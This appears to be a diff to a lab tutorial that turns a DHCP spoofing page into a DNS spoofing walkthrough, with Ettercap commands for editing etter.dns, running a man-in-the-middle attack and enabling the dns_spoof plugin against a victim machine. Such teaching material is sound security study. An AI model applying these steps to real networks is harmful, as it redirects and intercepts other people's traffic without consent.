@@ -1,8 +1,8 @@
-# DHCP SPOOFING
+# DNS SPOOFING
 
-**DHCP Spoofing** occurs when an attacker attempts to respond to DHCP requests and trying to list itself (spoof) as the default gateway or DNS server, hence, initiating a man in the middle attack. With that, it is possible that they can intercept traffic from users before forwarding to the real gateway or perform **DoS** by flooding the real DHCP server with requests to choke IP address resources.
+**DNS Spoofing**, also referred to as **DNS cache poisoning**, is a form of computer security hacking in which corrupt Domain Name System data is introduced into the DNS resolver's cache, causing the name server to return an incorrect result record, e.g. an IP address. This results in traffic being diverted to the attacker's computer (or any other computer).
 
-## DHCP Spoofing example with **Ettercap**
+## DNS Spoofing example with **Ettercap**
 
 ### Settings:
  * **Attacker:** debian machine
@@ -21,7 +21,7 @@
 * Edit the file `/etc/ettercap/etter.dns`
 
         sudo pico /etc/ettercap/etter.dns
-* Add lines in order to declare yourself as dhcp server
+* Add lines in order to declare yourself as DNS server
 
         <Website> <DNS_Query_Type> <Attacker_IP_Address>
 * E.g., add the following lines at the end of the file
@@ -51,7 +51,7 @@
     `/10.0.0.5//` means **ANY mac address**, **ONLY ip 10.0.0.1**, **ANY IPv6** and **ANY port**
 
         sudo ettercap -T -M <ATTACK_TYPE> <VICTIM_TARGET>
-
+* Press `p` and enter `dns_spoof`
 * Connect to the **Victim machine**  and run the following command
 
         ping facebook.com
